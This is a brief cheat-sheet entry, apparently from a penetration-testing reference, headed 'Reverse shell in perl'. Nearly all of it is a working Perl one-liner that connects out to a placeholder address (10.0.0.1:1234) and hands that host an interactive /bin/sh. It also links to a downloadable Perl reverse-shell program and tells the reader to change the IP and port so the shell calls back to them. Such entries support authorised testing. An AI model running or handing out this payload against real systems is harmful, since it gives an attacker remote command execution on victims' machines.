### Reverse shell in perl
``perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'``

http://pentestmonkey.net/tools/web-shells/perl-reverse-shell
This is a perl program which can be downloaded and modified to call back to you. (Remember to change IP + PORT)